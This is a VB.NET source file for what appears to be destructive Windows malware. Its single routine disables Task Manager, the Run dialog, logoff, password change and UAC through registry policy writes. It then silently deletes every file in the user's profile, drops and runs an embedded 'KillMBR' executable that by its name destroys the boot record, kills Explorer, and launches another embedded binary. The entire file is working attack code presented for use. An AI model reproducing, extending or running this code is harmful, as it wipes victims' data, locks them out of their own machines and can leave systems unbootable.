﻿Imports System.Windows.Forms
Imports Microsoft.Win32
Module Module1
    Dim RegistryKey As Object

    Sub Main()
        On Error Resume Next
        RegistryKey = CreateObject("Wscript.shell")
        RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 1, "REG_DWORD")
        RegistryKey = CreateObject("Wscript.shell")
        RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRun", 1, "REG_DWORD")
        RegistryKey = CreateObject("Wscript.shell")
        RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableCMD", 0, "REG_DWORD")
        RegistryKey = CreateObject("Wscript.shell")
        RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools", 0, "REG_DWORD")
        RegistryKey = CreateObject("Wscript.shell")
        RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin", 0, "REG_DWORD")
        RegistryKey = CreateObject("Wscript.shell")
        RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA", 0, "REG_DWORD")
        RegistryKey = CreateObject("Wscript.shell")
        RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\HideFastUserSwitching", 1, "REG_DWORD")
        RegistryKey = CreateObject("Wscript.shell")
        RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableChangePassword", 1, "REG_DWORD")
        RegistryKey = CreateObject("Wscript.shell")
        RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableLockWorkstation", 1, "REG_DWORD")
        RegistryKey = CreateObject("Wscript.shell")
        RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoLogoff", 1, "REG_DWORD")
        Shell("reg delete ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v Wallpaper /f", AppWinStyle.MaximizedFocus)
        Shell("cmd /c START /min cmd /c del %userprofile%\* /s /q /a /f", AppWinStyle.MaximizedFocus)
        Shell("RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", AppWinStyle.MaximizedFocus)
        IO.File.WriteAllBytes(My.Computer.FileSystem.SpecialDirectories.Temp & "\KillMBR.exe", My.Resources.KillMBR)
        Process.Start(My.Computer.FileSystem.SpecialDirectories.Temp & "\KillMBR.exe")
        Threading.Thread.CurrentThread.Sleep(1000)
        Shell("taskkill /f /im explorer.exe", AppWinStyle.MaximizedFocus)
        Threading.Thread.CurrentThread.Sleep(5000)
        RegistryKey = CreateObject("Wscript.shell")
        RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools", 1, "REG_DWORD")
        IO.File.WriteAllBytes(My.Computer.FileSystem.SpecialDirectories.Temp & "\cgwkwmbvzoPopup.exe", My.Resources.cgwkwmbvzoPopup)
        Process.Start(My.Computer.FileSystem.SpecialDirectories.Temp & "\cgwkwmbvzoPopup.exe")
        RegistryKey = CreateObject("Wscript.shell")
        Threading.Thread.CurrentThread.Sleep(5000)
        RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableCMD", 1, "REG_DWORD")
    End Sub

End Module
